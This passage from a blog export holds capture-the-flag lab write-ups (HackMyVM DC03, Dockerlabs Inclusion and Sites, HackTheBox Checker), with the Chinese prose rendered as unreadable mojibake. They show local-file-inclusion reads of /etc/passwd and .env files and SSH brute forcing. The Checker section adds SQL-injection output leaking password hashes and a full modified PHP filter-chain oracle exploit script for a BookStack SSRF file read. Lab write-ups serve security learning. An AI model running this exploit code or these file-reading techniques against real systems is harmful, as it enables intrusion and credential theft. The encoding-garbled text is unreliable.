Hashï¼Œå¹¶ä¸”åœ¨smbæœåŠ¡ä¸­æ‹¿åˆ°user.txtã€‚è¿™è¿˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åœ¨æ¸—é€ä¸­ä½¿ç”¨LLMNRï¼Œä¹‹å‰è¿˜æ˜¯åœ¨æ—¥å¿—åˆ†æçš„æ—¶å€™äº†è§£çš„ã€‚\nRootï¼šé€šè¿‡ldapç«¯å£è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œæˆ‘æœ¬æƒ³ç”¨çš„æ˜¯bloodhoundï¼Œä½†æ˜¯è€æ˜¯æŠ¥é”™ã€‚å‘ç°å½“å‰ç”¨æˆ·å¯ä»¥ä¿®æ”¹é«˜æƒé™ç»„çš„æˆå‘˜å¯†ç ï¼Œä¿®æ”¹ådumphashï¼Œæœ€åEvil-winrmç™»å½•ã€‚\nå…¶ä¸­é‡ç½®äº†ä¸€ä¸‹é¶æœºï¼Œå› æ­¤IPå˜åŒ–äº†ã€‚\n","date":"2025-03-01","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-dc03/","section":"Posts","summary":"","title":"HackMyVM-DC03","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Inclusion â¯ nmap 172.17.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 20:33 CST\rNmap scan report for sitio.dl (172.17.0.2)\rHost is up (0.000081s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\r| ssh-hostkey: | 256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)\r|_ 256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)\r80/tcp open http Apache httpd 2.4.57 ((Debian))\r|_http-server-header: Apache/2.4.57 (Debian)\r|_http-title: Apache2 Debian Default Page: It works\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.08 ms sitio.dl (172.17.0.2)\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 8.70 seconds Gobuster #\r[root@kali] /home/kali/Inclusion â¯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/shop (Status: 301) [Size: 307] [--\u0026gt; http://172.17.0.2/shop/]\r/.php (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== å†æ‰«**/shop**\n[root@kali] /home/kali/Inclusion â¯ gobuster dir -u http://172.17.0.2/shop -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2/shop\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/index.php (Status: 200) [Size: 1112]\r/.php (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== LFI #\rè¿›å…¥index.phpæŸ¥çœ‹\næºç ä¸­æŠ¥é”™äº†ä¸€ä¸ªGETå‚æ•°\nå°è¯•è¯»å–æ–‡ä»¶\n[root@kali] /home/kali/Inclusion â¯ ffuf -u \u0026#34;http://172.17.0.2/shop/index.php?archivo=FUZZ\u0026#34; -w ../Desktop/LFI-payload.txt -fl 45 æˆåŠŸè¯»å–åˆ°**/etc/passwd**\nçœ‹åˆ°å­˜åœ¨manchiå’Œsellerä¸¤ä¸ªç”¨æˆ·ï¼Œæ— æ³•è¯»å–sshå¯†é’¥\næˆ‘å°è¯•äº†è¯»å–æ—¥å¿—æ–‡ä»¶ä»¥åŠå…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œéƒ½å¤±è´¥äº†\nHydra #\rè¿™çœŸçš„æ˜¯æˆ‘æœ€ä¸å–œæ¬¢çš„æ–¹å¼ğŸ˜”\nå¾—åˆ°å¯†ç æ˜¯lovely\nRoot #\rç”±äºæ²¡æœ‰ç‰¹æ®Šçš„å‘½ä»¤ï¼Œè¿™é‡Œéœ€è¦ä¸Šä¼ æ–‡ä»¶æ¥è¿›è¡ŒæŸ¥æ‰¾\nä½†æ˜¯æ²¡æœ‰ä»»ä½•å¯ä»¥ä¸‹è½½çš„å‘½ä»¤ï¼Œcurlã€wgetéƒ½æ²¡æœ‰\nå› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡sshç™»å½•çš„ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨scpæ¥ä¸Šä¼ æ–‡ä»¶\nlinpeaså’Œpspyæˆ‘éƒ½ä¸Šä¼ è¿‡äº†ï¼Œæ²¡æœ‰æ‰¾åˆ°æœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œå› æ­¤ä¸Šä¼ suforceè¿›è¡Œç ´è§£å¯†ç \nç ´è§£å¾—åˆ°å¯†ç ï¼šqwerty\næŸ¥çœ‹sellerçš„ç‰¹æ®Šæƒé™å‘½ä»¤\nseller@0c86b8078585:/tmp$ sudo -l\rMatching Defaults entries for seller on 0c86b8078585:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser seller may run the following commands on 0c86b8078585:\r(ALL) NOPASSWD: /usr/bin/php ç‰¹æ®Šå‘½ä»¤æ˜¯phpï¼Œé‚£å°±å¥½å¼„äº†\nphp | GTFOBins Summary #\rUserï¼šLFIè¯»å–**/etc/passwdè·å–åˆ°ç”¨æˆ·åï¼Œä½†æ˜¯å…¶ä»–æœ‰ä»·å€¼çš„ä¸œè¥¿è¯»ä¸åˆ°ï¼Œåªèƒ½ssh**çˆ†ç ´ã€‚\nRootï¼šåŒæ ·suForceçˆ†ç ´å¯†ç ï¼Œé€šè¿‡phpå‘½ä»¤è¡Œææƒã€‚\næˆ‘çœŸçš„å¾ˆä¸å–œæ¬¢è¿™ç§çˆ†ç ´æµæ¸—é€æ–¹å¼ï¼Œè®©è¿™ä¸ªé¶æœºéƒ½å¤±å»äº†ä¹è¶£ğŸ˜¡\n","date":"2025-02-28","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-inclusion/","section":"Posts","summary":"","title":"Dockerlabs-Inclusion","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/sites â¯ nmap 172.17.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 20:05 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000077s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 cb:8f:50:db:6d:d8:d4:ac:bf:54:b0:62:12:7c:f0:01 (ECDSA)\r|_ 256 ca:6b:c7:0c:2a:d6:0e:3e:ff:c4:6e:61:ac:35:db:01 (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Configuraci\\xC3\\xB3n de Apache y Seguridad en Sitios Web\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.08 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 10.63 seconds Gobuster #\r[root@kali] /home/kali/sites â¯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php â\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/.php (Status: 403) [Size: 275]\r/vulnerable.php (Status: 200) [Size: 37]\r/server-status (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== ReadAnyFiles #\réœ€è¦æä¾›ä¸€ä¸ªpageå‚æ•°æˆ–è€…usernameå‚æ•°ï¼Œè¿™é‡Œå°è¯•è¯»å–**/etc/passwd**\nçœ‹åˆ°å­˜åœ¨chocolateç”¨æˆ·ï¼Œæ— æ³•ç›´æ¥è¯»å–sshå¯†é’¥\nç”±äºåœ¨é¡µé¢ä¸­å‘ç°äº†è¿™ä¸ªconfæ–‡ä»¶\nå°è¯•è¯»å–\n[root@kali] /home/kali/sites â¯ curl --path-as-is \u0026#39;http://172.17.0.2/vulnerable.php?page=/etc/apache2/sites-available/sitio.conf\u0026#39; \u0026lt;VirtualHost *:80\u0026gt;\rServerAdmin webmaster@tusitio.com\rDocumentRoot /var/www/html\rServerName sitio.dl\rServerAlias www.sitio.dl\r\u0026lt;Directory /var/www/html\u0026gt;\rOptions Indexes FollowSymLinks\rAllowOverride All\rRequire all granted\r\u0026lt;/Directory\u0026gt;\r# Bloquear acceso al archivo archivitotraviesito (cuidadito cuidadin con este regalin)\r# \u0026lt;Files \u0026#34;archivitotraviesito\u0026#34;\u0026gt;\r# Require all denied\r# \u0026lt;/Files\u0026gt;\rErrorLog ${APACHE_LOG_DIR}/error.log\rCustomLog ${APACHE_LOG_DIR}/access.log combined\r\u0026lt;/VirtualHost\u0026gt; å“ï¼Œçœ‹ä¸æ‡‚ï¼Œæ‹¿ç»™ç¿»è¯‘\næ³¨é‡Šè¯´æ˜è¦é˜»æ­¢å¯¹åä¸º archivitotraviesito çš„æ–‡ä»¶çš„è®¿é—®ã€‚ç›¸å…³é…ç½®è¢«æ³¨é‡Šæ‰äº†ï¼Œæœªç”Ÿæ•ˆã€‚\nå°è¯•è®¿é—® http://172.17.0.2/archivitotraviesito\nå¾—åˆ°ç™»å½•å¯†ç \nRoot #\ræŸ¥çœ‹ç‰¹æ®Šæƒé™å‘½ä»¤\nchocolate@805cedff7533:~$ sudo -l\rMatching Defaults entries for chocolate on 805cedff7533:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser chocolate may run the following commands on 805cedff7533:\r(ALL) NOPASSWD: /usr/bin/sed åœ¨GTFObinsä¸­æœ‰è®°å½•ï¼Œå¯ä»¥ç›´æ¥ç”¨\nsed | GTFOBins Summary #\ræ„Ÿè§‰è¿™ä¸ªä¸åƒæ˜¯ä¸€ä¸ªMediumçš„é¶æœºã€‚ã€‚ã€‚\nUserï¼šä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥çœ‹åˆ°apacheçš„é…ç½®æ–‡ä»¶çš„æ³¨é‡Šä¸­æœ‰ä¸€ä¸ªéšè—çš„è·¯ç”±ï¼Œè®¿é—®å¾—åˆ°sshå¯†ç ã€‚\nRootï¼šæŸ¥GTFOç›´æ¥ææƒï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚\n","date":"2025-02-28","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-sites/","section":"Posts","summary":"","title":"Dockerlabs-Sites","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Checker â¯ nmap checker.htb -sV PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd\r8080/tcp open http Apache httpd\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel åœ¨checker.htb:8080é¡µé¢ä¸Šå‘ç°äº†ä¸€ä¸ªå­åŸŸåï¼švault\nCVE-2023-1545 #\rå…³æ³¨åˆ°8080ç«¯å£ä¸Šå¼€æ”¾çš„æ˜¯TeampassæœåŠ¡\næœç´¢åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥çš„CVEæ¼æ´\nSQL Injection in nilsteampassnet/teampass | CVE-2023-1545 | Snyk [root@kali] /home/kali/Checker â¯ ./poc.sh http://checker.htb:8080/ â\rThere are 2 users in the system:\radmin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya\rbob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy ä½¿ç”¨johnè¿›è¡Œç ´è§£å¾—åˆ°bobçš„å¯†ç \nbob:cheerleader å¯ä»¥ç›´æ¥ç™»å½•åˆ°åå°\næ‹¿åˆ°bobçš„å¯†ç ï¼Œå¯ä»¥è¿”å›åˆ°80ç«¯å£ä¸Šç™»å½•\nå°è¯•ç™»å½•readerçš„è´¦æˆ·ï¼šhiccup-publicly-genesis\nå‘ç°éœ€è¦éªŒè¯ç ï¼Œå› æ­¤æ— æ³•ç›´æ¥ç™»å½•\nCVE-2023-6199 #\rç™»å½•bookstacké¡µé¢ï¼Œåœ¨æºä»£ç ä¸­æ‰¾åˆ°ç‰ˆæœ¬ä¿¡æ¯ï¼š23.10.2\næœç´¢å¾—åˆ°ä¸€ä¸ªå¯èƒ½å­˜åœ¨çš„æ¼æ´\nLFR via SSRF in BookStack | Blog | Fluid Attacks æ ¹æ®æ–‡ä¸­æ“ä½œï¼Œä¼šå‘ç°æŠ¥é”™ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨\nå†çœ‹çœ‹æ–‡ç« å‘ç°éœ€è¦ä¿®æ”¹æ–‡ä»¶å†…å®¹æ‰è¡Œ\néœ€è¦ä¿®æ”¹çš„æ˜¯**/php_filter_chains_oracle_exploit/filters_chain_oracle/coreé‡Œçš„requestor.py**ï¼ŒæŠŠpayloadæ’å…¥åˆ°imgæ ‡ç­¾ä¸­ï¼Œå°±åƒä¸‹æ–‡ä¸­çš„ä¸€æ ·æ‰€æåŠçš„ä¸€æ ·ã€‚\nBook Stack v23.10.2 - LFR via Blind SSRF | Advisories | Fluid Attacks è¿™æ˜¯ä¿®æ”¹è¿‡çš„requestor.py\næˆ–è€…ä¹Ÿå¯ä»¥é€šè¿‡Githubçš„è¿™ä¸ªfork\npwnter/php_filter_chains_oracle_exploit: A CLI to exploit parameters vulnerable to PHP filter chain error based oracle. import json\rimport requests\rimport time\rfrom filters_chain_oracle.core.verb import Verb\rfrom filters_chain_oracle.core.utils import merge_dicts\rimport re\r\u0026#34;\u0026#34;\u0026#34;\rClass Requestor, defines all the request logic.\r\u0026#34;\u0026#34;\u0026#34;\rclass Requestor:\rdef __init__(self, file_to_leak, target, parameter, data=\u0026#34;{}\u0026#34;, headers=\u0026#34;{}\u0026#34;, verb=Verb.POST, in_chain=\u0026#34;\u0026#34;,\rproxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):\rself.file_to_leak = file_to_leak\rself.target = target\rself.parameter = parameter\rself.headers = headers\rself.verb = verb\rself.json_input = json_input\rself.match = match\rprint(\u0026#34;[*] The following URL is targeted : {}\u0026#34;.format(self.target))\rprint(\u0026#34;[*] The following local file is leaked : {}\u0026#34;.format(self.file_to_leak))\rprint(\u0026#34;[*] Running {} requests\u0026#34;.format(self.verb.name))\rif data != \u0026#34;{}\u0026#34;:\rprint(\u0026#34;[*] Additionnal data used : {}\u0026#34;.format(data))\rif headers != \u0026#34;{}\u0026#34;:\rprint(\u0026#34;[*] Additionnal headers used : {}\u0026#34;.format(headers))\rif in_chain != \u0026#34;\u0026#34;:\rprint(\u0026#34;[*] The following chain will be in each request : {}\u0026#34;.format(in_chain))\rin_chain = \u0026#34;|convert.iconv.{}\u0026#34;.format(in_chain)\rif match:\rprint(\u0026#34;[*] The following pattern will be matched for the oracle : {}\u0026#34;.format(match))\rself.in_chain = in_chain\rself.data = json.loads(data)\rself.headers = json.loads(headers)\rself.delay = float(delay)\rif proxy:\rself.proxies = {\r\u0026#39;http\u0026#39;: f\u0026#39;{proxy}\u0026#39;,\r\u0026#39;https\u0026#39;: f\u0026#39;{proxy}\u0026#39;,\r}\relse:\rself.proxies = None\rself.instantiate_session()\rif time_based_attack:\rself.time_based_attack = self.error_handling_duration()\rprint(\u0026#34;[+] Error handling duration : {}\u0026#34;.format(self.time_based_attack))\relse:\rself.time_based_attack = False\r\u0026#34;\u0026#34;\u0026#34;\rInstantiates a requests session for optimization\r\u0026#34;\u0026#34;\u0026#34;\rdef instantiate_session(self):\rself.session = requests.Session()\rself.session.headers.update(self.headers)\rself.session.proxies = self.proxies\rself.session.verify = False\rdef join(self, *x):\rreturn \u0026#39;|\u0026#39;.join(x)\r\u0026#34;\u0026#34;\u0026#34;\rUsed to see how much time a 500 error takes to calibrate the timing attack\r\u0026#34;\u0026#34;\u0026#34;\rdef error_handling_duration(self):\rchain = \u0026#34;convert.base64-encode\u0026#34;\rrequ = self.req_with_response(chain)\rself.normal_response_time = requ.elapsed.total_seconds()\rself.blow_up_utf32 = \u0026#39;convert.iconv.L1.UCS-4\u0026#39;\rself.blow_up_inf = self.join(*[self.blow_up_utf32] * 15)\rchain_triggering_error = f\u0026#34;convert.base64-encode|{self.blow_up_inf}\u0026#34;\rrequ = self.req_with_response(chain_triggering_error)\rreturn requ.elapsed.total_seconds() - self.normal_response_time\r\u0026#34;\u0026#34;\u0026#34;\rUsed to parse the option parameter sent by the user\r\u0026#34;\u0026#34;\u0026#34;\rdef parse_parameter(self, filter_chain):\rdata = {}\rif \u0026#39;[\u0026#39; and \u0026#39;]\u0026#39; in self.parameter: # Parse array elements\rmain_parameter = [re.search(r\u0026#39;^(.*?)\\[\u0026#39;, self.parameter).group(1)]\rsub_parameters = re.findall(r\u0026#39;\\[(.*?)\\]\u0026#39;, self.parameter)\rall_params = main_parameter + sub_parameters\rjson_object = {}\rtemp = json_object\rfor i, element in enumerate(all_params):\rif i == len(all_params) - 1:\rtemp[element] = filter_chain\relse:\rtemp[element] = {}\rtemp = temp[element]\rdata = json_object\relse:\rdata[self.parameter] = filter_chain\rreturn merge_dicts(data, self.data)\r\u0026#34;\u0026#34;\u0026#34;\rReturns the response of a request defined with all options\r\u0026#34;\u0026#34;\u0026#34;\rdef req_with_response(self, s):\rif self.delay \u0026gt; 0:\rtime.sleep(self.delay)\rfilter_chain = f\u0026#39;php://filter/{s}{self.in_chain}/resource={self.file_to_leak}\u0026#39;\r# DEBUG print(filter_chain)\rmerged_data = self.parse_parameter(filter_chain)\r####Add â†“\rimport base64\rinsert_base64 = base64.b64encode(filter_chain.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;)\rpayload = f\u0026#34;\u0026lt;img src=\u0026#39;data:image/png;base64,{insert_base64}\u0026#39;/\u0026gt;\u0026#34;\rmerged_data[self.parameter] = payload # Fixed indentation\r#####Add â†‘\r# Make the request, the verb and data encoding is defined\rtry:\rif self.verb == Verb.GET:\rrequ = self.session.get(self.target, params=merged_data)\rreturn requ\relif self.verb == Verb.PUT:\rif self.json_input:\rrequ = self.session.put(self.target, json=merged_data)\relse:\rrequ = self.session.put(self.target, data=merged_data)\rreturn requ\relif self.verb == Verb.DELETE:\rif self.json_input:\rrequ = self.session.delete(self.target, json=merged_data)\relse:\rrequ = self.session.delete(self.target, data=merged_data)\rreturn requ\relif self.verb == Verb.POST:\rif self.json_input:\rrequ = self.session.post(self.target, json=merged_data)\relse:\rrequ = self.session.post(self.target, data=merged_data)\rreturn requ\rexcept requests.exceptions.ConnectionError:\rprint(\u0026#34;[-] Could not instantiate a connection\u0026#34;)\rexit(1)\rreturn None\r\u0026#34;\u0026#34;\u0026#34;\rUsed to determine if the answer trigged the error based oracle\rTODO : increase the efficiency of the time based oracle\r\u0026#34;\u0026#34;\u0026#34;\rdef error_oracle(self, s):\rrequ = self.req_with_response(s)\rif self.match:\r# DEBUG print(\u0026#34;PATT\u0026#34;, (self.match in requ.text))\rreturn self.match in requ.text\rif self.time_based_attack:\r# DEBUG print(\u0026#34;ELAP\u0026#34;, requ.elapsed.total_seconds() \u0026gt; ((self.time_based_attack/2)+0.01))\rreturn requ.elapsed.total_seconds() \u0026gt; ((self.time_based_attack / 2) + 0.01)\r# DEBUG print(\u0026#34;CODE\u0026#34;, requ.status_code == 500)\rreturn requ.status_code == 500 Google Auth #\rç”±äºä¹‹å‰sshç™»å½•éœ€è¦éªŒè¯ç ï¼Œç»è¿‡æœç´¢æˆ‘å¾—åˆ°äº†ä»–çš„è·¯å¾„\ngoogle/google-authenticator-libpam åœ¨æµè§ˆBookstacké‡Œé¢ä¹¦ç±çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªå¯èƒ½å­˜åœ¨çš„è·¯å¾„\nè„šæœ¬çš„è§£é‡Šæ˜¯ï¼šå°† /home ç›®å½•çš„æ‰€æœ‰å†…å®¹é€’å½’åœ°å¤åˆ¶åˆ° /backup/home_backup\nå› æ­¤éœ€è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„å°±æ˜¯ï¼š/backup/home_backup/home/reader/.google_authenticator\nåˆ°ä¸‹é¢è¿™ä¸ªç½‘ç«™å»ç”ŸæˆéªŒè¯ç \nOnline one-time password generator / TOTP (Google Authenticator) Online / 2FA å¤§æ¦‚ç‡æ˜¯æ—¶åŒºçš„é—®é¢˜ï¼Ÿå› ä¸ºæ¯ä¸ªéªŒè¯ç éƒ½æ˜¯æœ‰æ—¶æ•ˆçš„ï¼Œå¤§æ¦‚ä¹Ÿå°±å‡ åç§’ã€‚æˆ‘æŠŠVPNè°ƒåˆ°äº†USèŠ‚ç‚¹å°±èƒ½æ­£å¸¸ç™»å½•äº†ã€‚\nRoot #\ræŸ¥çœ‹ç‰¹æ®Šæƒé™å‘½ä»¤\nreader@checker:~$ sudo -l\rMatching Defaults entries for reader on checker:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser reader may run the following commands on checker:\r(ALL) NOPASSWD: /opt/hash-checker/check-leak.sh * æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè„šæœ¬çš„å…·ä½“å†…å®¹\nreader@checker:~$ cat /opt/hash-checker/check-leak.sh\r#!/bin/bash\rsource `dirname $0`/.env\rUSER_NAME=$(/usr/bin/echo \u0026#34;$1\u0026#34; | /usr/bin/tr -dc \u0026#39;[:alnum:]\u0026#39;)\r/opt/hash-checker/check_leak \u0026#34;$USER_NAME\u0026#34; å…¶ä¸­çš„**/opt/hash-checker/check_leak**æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ— æ³•ç›´æ¥æŸ¥çœ‹æºç \nä¸è¿‡å¯ä»¥ä½¿ç”¨IDAè¿›è¡Œåç¼–è¯‘\nIDA #\rint __cdecl main(int argc, const char **argv, const char **envp)\r{\rconst char *v3; // rdx\runsigned int v5; // [rsp+14h] [rbp-3Ch]\rchar *v6; // [rsp+18h] [rbp-38h]\rchar *v7; // [rsp+20h] [rbp-30h]\rchar *v8; // [rsp+28h] [rbp-28h]\rchar *v9; // [rsp+30h] [rbp-20h]\rchar *s; // [rsp+40h] [rbp-10h]\rvoid *ptr; // [rsp+48h] [rbp-8h]\rv6 = getenv(\u0026#34;DB_HOST\u0026#34;);\rv7 = getenv(\u0026#34;DB_USER\u0026#34;);\rv8 = getenv(\u0026#34;DB_PASSWORD\u0026#34;);\rv9 = getenv(\u0026#34;DB_NAME\u0026#34;);\rif ( *(_BYTE *)(((unsigned __int64)(argv + 1) \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(argv + 1);\rs = (char *)argv[1];\rif ( !v6 || !v7 || !v8 || !v9 )\r{\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfwrite(\u0026#34;Error: Missing database credentials in environment\\n\u0026#34;, 1uLL, 0x33uLL, stderr);\r__asan_handle_no_return();\rexit(1);\r}\rif ( argc != 2 )\r{\rif ( *(_BYTE *)(((unsigned __int64)argv \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(argv);\rv3 = *argv;\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfprintf(stderr, \u0026#34;Usage: %s \u0026lt;USER\u0026gt;\\n\u0026#34;, v3);\r__asan_handle_no_return();\rexit(1);\r}\rif ( !s )\rgoto LABEL_40;\rif ( *(_BYTE *)(((unsigned __int64)s \u0026gt;\u0026gt; 3) + 0x7FFF8000) != 0\r\u0026amp;\u0026amp; ((unsigned __int8)s \u0026amp; 7) \u0026gt;= *(_BYTE *)(((unsigned __int64)s \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r{\r__asan_report_load1(s);\r}\rif ( !*s )\r{\rLABEL_40:\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfwrite(\u0026#34;Error: \u0026lt;USER\u0026gt; is not provided.\\n\u0026#34;, 1uLL, 0x1FuLL, stderr);\r__asan_handle_no_return();\rexit(1);\r}\rif ( strlen(s) \u0026gt; 0x14 )\r{\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfwrite(\u0026#34;Error: \u0026lt;USER\u0026gt; is too long. Maximum length is 20 characters.\\n\u0026#34;, 1uLL, 0x3CuLL, stderr);\r__asan_handle_no_return();\rexit(1);\r}\rptr = (void *)fetch_hash_from_db(v6, v7, v8, v9, s);\rif ( ptr )\r{\rif ( (unsigned __int8)check_bcrypt_in_file(\u0026#34;/opt/hash-checker/leaked_hashes.txt\u0026#34;, ptr) )\r{\rputs(\u0026#34;Password is leaked!\u0026#34;);\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;edata \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;edata);\rfflush(edata);\rv5 = write_to_shm(ptr);\rprintf(\u0026#34;Using the shared memory 0x%X as temp location\\n\u0026#34;, v5);\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;edata \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;edata);\rfflush(edata);\rsleep(1u);\rnotify_user(v6, v7, v8, v9, v5);\rclear_shared_memory(v5);\r}\relse\r{\rputs(\u0026#34;User is safe.\u0026#34;);\r}\rfree(ptr);\r}\relse\r{\rputs(\u0026#34;User not found in the database.\u0026#34;);\r}\rreturn 0;\r} ç”±äºæˆ‘ä»¬ä¸çŸ¥é“envé‡Œé¢æœ‰ä»€ä¹ˆï¼Œè¿™ä¸ªç›®å½•ä¸‹çš„**.envè¿˜æ˜¯éœ€è¦ä½¿ç”¨filterchains**æ¥è¯»ï¼ˆæœ‰æ—¶å€™ä¼šå¤±çµï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿ\nå¾—åˆ°æ•°æ®åº“ç”¨æˆ·ä»¥åŠå¯†ç \nbookstack:pK8HK7IHCKLCNHUJ7 ç™»å½•åæŸ¥çœ‹userè¡¨ï¼Œå‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·\nå› 